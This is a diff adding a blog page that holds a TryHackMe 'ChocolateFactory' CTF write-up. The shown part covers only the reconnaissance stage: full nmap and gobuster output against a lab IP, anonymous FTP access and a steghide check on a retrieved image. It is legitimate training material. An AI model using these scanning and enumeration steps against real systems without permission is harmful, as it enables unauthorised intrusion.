@@ -1,0 +1,872 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Language" content="en">
+
+    <meta name="author" content="d4rkn1gh7 | Balaji Anandhan">
+    <meta name="description" content="This is the writeup of ChocolateFactory room in TryHackMe">
+    <meta name="keywords" content="blog,ctf,hacking,coding">
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="ChocolateFactory TryHackMe Writeup"/>
+<meta name="twitter:description" content="This is the writeup of ChocolateFactory room in TryHackMe"/>
+
+    <meta property="og:title" content="ChocolateFactory TryHackMe Writeup" />
+<meta property="og:description" content="This is the writeup of ChocolateFactory room in TryHackMe" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/chocolatefactory/" />
+<meta property="article:published_time" content="2021-01-19T17:27:15+05:30" />
+<meta property="article:modified_time" content="2021-01-19T17:27:15+05:30" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/battery/" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/overpass3/" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/chill_hack/" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/unbaked_pie/" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/all_in_one/" />
+
+
+
+    <title>
+  ChocolateFactory TryHackMe Writeup · d4rkn1gh7 | Tech Blog
+</title>
+
+    
+      <link rel="canonical" href="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/chocolatefactory/">
+    
+
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css?family=Lato:400,700%7CMerriweather:300,700%7CSource+Code+Pro:400,700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.1.7/css/fork-awesome.min.css"
+      integrity="sha256-gsmEoJAws/Kd3CjuOQzLie5Q3yshhvmo7YNtBG7aaEY=" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8/normalize.min.css">
+    
+      
+      
+      <link rel="stylesheet" href="/css/coder.min.f01c647a0d25b40da992a37c3376291185eed8a50ced8c26cc2c0bcfe38c97df.css" integrity="sha256-8Bxkeg0ltA2pkqN8M3YpEYXu2KUM7YwmzCwLz&#43;OMl98=" crossorigin="anonymous" media="screen" />
+    
+
+    
+
+    
+      
+        
+        
+        <link rel="stylesheet" href="/css/coder-dark.min.126ad3988d46bdae6217a11105b53c9662bca05f39d42d3c0fb366919d334620.css" integrity="sha256-EmrTmI1Gva5iF6ERBbU8lmK8oF851C08D7NmkZ0zRiA=" crossorigin="anonymous" media="screen" />
+      
+    
+
+    
+
+    
+
+    <link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+    <link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+    
+      <script defer src="https://twemoji.maxcdn.com/v/13.0.1/twemoji.min.js"
+        integrity="sha384-5f4X0lBluNY/Ib4VhGx0Pf6iDCF99VGXJIyYy7dDLY5QlEd7Ap0hICSSZA1XYbc4" crossorigin="anonymous"></script>
+    
+
+    <meta name="generator" content="Hugo 0.80.0" />
+  </head>
+
+  
+  
+    
+  
+  <body class="colorscheme-auto"
+        onload=" twemoji.parse(document.body); "
+  >
+    
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+    <main class="wrapper">
+      <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="/">
+      d4rkn1gh7 | Tech Blog
+    </a>
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/posts/">Posts</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/categories/tryhackme">TryHackMe</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/categories/hackthebox">HackTheBox</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/categories/codinglinux">Coding | Linux</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/tags/">Tags</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/about/">About</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+      <div class="content">
+        
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">ChocolateFactory TryHackMe Writeup</h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa fa-calendar" aria-hidden="true"></i>
+              <time datetime='2021-01-19T17:27:15&#43;05:30'>
+                January 19, 2021
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa fa-clock-o" aria-hidden="true"></i>
+              13-minute read
+            </span>
+          </div>
+          <div class="authors">
+    <i class="fa fa-user" aria-hidden="true"></i>
+      <a href="/authors/d4rkn1gh7/">d4rkn1gh7</a></div>
+          <div class="categories">
+  <i class="fa fa-folder" aria-hidden="true"></i>
+    <a href="/categories/tryhackme/">TryHackMe</a></div>
+
+          <div class="tags">
+  <i class="fa fa-tag" aria-hidden="true"></i>
+    <a href="/tags/ctf/">ctf</a>
+      <span class="separator">•</span>
+    <a href="/tags/tryhackme/">tryhackme</a>
+      <span class="separator">•</span>
+    <a href="/tags/easy_box/">easy_box</a></div>
+
+        </div>
+      </header>
+
+      <div>
+        
+        <h1 id="__chocolate-factory-tryhackme-writeup__"><strong>Chocolate Factory TryHackMe Writeup</strong></h1>
+<p>This is the writeup of the <a href="https://tryhackme.com/room/chocolatefactory">ChocolateFactory</a> room.</p>
+<p><img src="/TryHackMe/ChocolateFactory/BoxImage.jpeg" alt=""></p>
+<h2 id="__first-stage--enumeration__"><strong>First Stage : Enumeration</strong></h2>
+<p>Let&rsquo;s fire up nmap.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># Nmap 7.91 scan initiated Tue Jan 19 11:06:32 2021 as: nmap -sC -sV -T4 -vv -p- -oN nmapscan 10.10.110.153
+Warning: 10.10.110.153 giving up on port because retransmission cap hit (6).
+Nmap scan report for 10.10.110.153
+Host is up, received syn-ack (0.15s latency).
+Scanned at 2021-01-19 11:06:33 IST for 1453s
+Not shown: 65448 closed ports
+Reason: 65448 conn-refused
+PORT      STATE    SERVICE     REASON      VERSION
+21/tcp    open     ftp         syn-ack     vsftpd 3.0.3
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-rw-r--    1 1000     1000       208838 Sep 30 14:31 gum_room.jpg
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.8.74.96
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp    open     ssh         syn-ack     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 16:31:bb:b5:1f:cc:cc:12:14:8f:f0:d8:33:b0:08:9b (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuEAWoQHbW+vehIUZLTiJyXKjUAAJP0sgW/P0LHVaf4C5+1oEBXcDBBZC7SoL6MTMYn8zlEfhCbjQb7A/Yf2IxLzU5f35yuhEbWEvYmuP4PmBB04CJdDItU0xwAbGsufyzZ6td6LKm+oim8xJn/lVTeykVZTASF9iuY9tqwA933AfjqKlNByj82TAmlVkQ93bq+e7Gu/pRkSn++RkIUd4f8ogmLLusEh+vbGkZDj4UdwTIZbOSeuS4oz/umpkJPhekGVoyzjPMRIq9cwdeKIVRwUNbp4BoJjYKjbCC9YY8u/7O6lhtwo4uAp7Q9PfRRCiCpVimm6kIgBmgqqKbueDl
+|   256 e7:1f:c9:db:3e:aa:44:b6:72:10:3c:ee:db:1d:33:90 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAYfNs0w6oOdzMM4B2JyB5pWr1qq9oB+xF0Voyn4gBYEGPC9+dqPudYagioH1ArjIHZFF0G24rt7L/6x1OPJSts=
+|   256 b4:45:02:b6:24:8e:a9:06:5f:6c:79:44:8a:06:55:5e (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAwurtl1AFxJU7cHOfbCNr34YoTmAVnVUIXt4QHPD1B2
+80/tcp    open     http        syn-ack     Apache httpd 2.4.29 ((Ubuntu))
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| http-methods: 
+|_  Supported Methods: HEAD GET POST OPTIONS
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Site doesn&#39;t have a title (text/html).
+100/tcp   open     newacct?    syn-ack
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &#34;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&#34;
+101/tcp   open     hostname?   syn-ack
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &#34;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&#34;
+102/tcp   open     iso-tsap?   syn-ack
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &#34;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&#34;
+103/tcp   open     gppitnp?    syn-ack
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &#34;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&#34;
+104/tcp   open     acr-nema?   syn-ack
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+|_dicom-ping: 
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &#34;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&#34;
+105/tcp   open     csnet-ns?   syn-ack
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &#34;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&#34;
+106/tcp   open     pop3pw?     syn-ack
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &#34;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&#34;
+107/tcp   open     rtelnet?    syn-ack
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &#34;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&#34;
+108/tcp   open     snagas?     syn-ack
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &#34;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&#34;
+109/tcp   open     pop2?       syn-ack
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &#34;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&#34;
+110/tcp   open     pop3?       syn-ack
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &#34;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&#34;
+111/tcp   open     rpcbind?    syn-ack
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   NULL, RPCCheck: 
+|     &#34;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&#34;
+112/tcp   open     mcidas?     syn-ack
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &#34;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&#34;
+113/tcp   open     ident?      syn-ack
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RTSPRequest, SIPOptions, SSLSessionReq, TerminalServer, WMSRequest, X11Probe: 
+|_    http://localhost/key_rev_key &lt;- You will find the key here!!!
+114/tcp   open     audionews?  syn-ack
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &#34;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&#34;
+115/tcp   open     sftp?       syn-ack
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &#34;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&#34;
+116/tcp   open     ansanotify? syn-ack
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &#34;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&#34;
+117/tcp   open     uucp-path?  syn-ack
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &#34;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&#34;
+118/tcp   open     sqlserv?    syn-ack
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &#34;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&#34;
+119/tcp   open     nntp?       syn-ack
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &#34;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&#34;
+120/tcp   open     cfdptkt?    syn-ack
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &#34;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&#34;
+121/tcp   open     erpc?       syn-ack
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &#34;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&#34;
+122/tcp   open     smakynet?   syn-ack
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &#34;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&#34;
+123/tcp   open     ntp?        syn-ack
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &#34;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&#34;
+124/tcp   open     ansatrader? syn-ack
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &#34;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&#34;
+125/tcp   open     locus-map?  syn-ack
+|_auth-owners: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &#34;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .&#39;__&#39;__&#39;__&#39;__&#39;__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__&#39;__&#39;_`.__| `. \x20 ___ \r
+|     \&#39;__&#39;__&#39;__\x20__&#39;_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&#34;
+1887/tcp  filtered filex-lport no-response
+1941/tcp  filtered dic-aida    no-response
+2352/tcp  filtered pslserver   no-response
+3694/tcp  filtered unknown     no-response
+10264/tcp filtered unknown     no-response
+10527/tcp filtered unknown     no-response
+10668/tcp filtered unknown     no-response
+11480/tcp filtered unknown     no-response
+12394/tcp filtered unknown     no-response
+12672/tcp filtered unknown     no-response
+12849/tcp filtered unknown     no-response
+14691/tcp filtered unknown     no-response
+18118/tcp filtered unknown     no-response
+19412/tcp filtered hp-sessmon  no-response
+20440/tcp filtered unknown     no-response
+24212/tcp filtered unknown     no-response
+27361/tcp filtered unknown     no-response
+28410/tcp filtered unknown     no-response
+28878/tcp filtered unknown     no-response
+29509/tcp filtered unknown     no-response
+31241/tcp filtered unknown     no-response
+31803/tcp filtered unknown     no-response
+32820/tcp filtered unknown     no-response
+33168/tcp filtered unknown     no-response
+33522/tcp filtered unknown     no-response
+34783/tcp filtered unknown     no-response
+36217/tcp filtered unknown     no-response
+38149/tcp filtered unknown     no-response
+38717/tcp filtered unknown     no-response
+38881/tcp filtered unknown     no-response
+39365/tcp filtered unknown     no-response
+39840/tcp filtered unknown     no-response
+42126/tcp filtered unknown     no-response
+42522/tcp filtered unknown     no-response
+42642/tcp filtered unknown     no-response
+46053/tcp filtered unknown     no-response
+46378/tcp filtered unknown     no-response
+47612/tcp filtered unknown     no-response
+49720/tcp filtered unknown     no-response
+50167/tcp filtered unknown     no-response
+51017/tcp filtered unknown     no-response
+51129/tcp filtered unknown     no-response
+53811/tcp filtered unknown     no-response
+54919/tcp filtered unknown     no-response
+56899/tcp filtered unknown     no-response
+56992/tcp filtered unknown     no-response
+57210/tcp filtered unknown     no-response
+58328/tcp filtered unknown     no-response
+59224/tcp filtered unknown     no-response
+60536/tcp filtered unknown     no-response
+61900/tcp filtered unknown     no-response
+62583/tcp filtered unknown     no-response
+63054/tcp filtered unknown     no-response
+63220/tcp filtered unknown     no-response
+65005/tcp filtered unknown     no-response
+65050/tcp filtered unknown     no-response
+65209/tcp filtered unknown     no-response
+65485/tcp filtered unknown     no-response
+
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue Jan 19 11:30:48 2021 -- 1 IP address (1 host up) scanned in 1456.19 seconds
+
+</code></pre></div><p>There was many ports open , don&rsquo;t panic let&rsquo;s start with the usual ones.</p>
+<p>So the usual ports are :</p>
+<ul>
+<li>21</li>
+<li>22</li>
+<li>80</li>
+</ul>
+<p>So let&rsquo;s fireup gobuster.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.110.153/
+[+] Threads:        50
+[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     txt,html,php
+[+] Timeout:        10s
+===============================================================
+2021/01/19 11:07:10 Starting gobuster
+===============================================================
+/index.html (Status: 200)
+/home.php (Status: 200)
+/validate.php (Status: 200)
+/server-status (Status: 403)
+===============================================================
+2021/01/19 11:51:52 Finished
+===============================================================
+</code></pre></div><p>So let&rsquo;s go for <strong>FTP</strong>  and try anonymous login.</p>
+<p><img src="/TryHackMe/ChocolateFactory/ftplogin.png" alt=""></p>
+<p>Hence we got a img file we can use steghide .</p>
+<blockquote>
+<p>steghide &ndash;info gum_room.jpg</p>
+</blockquote>
+<p><img src="/TryHackMe/ChocolateFactory/steginfo.png" alt=""></p>
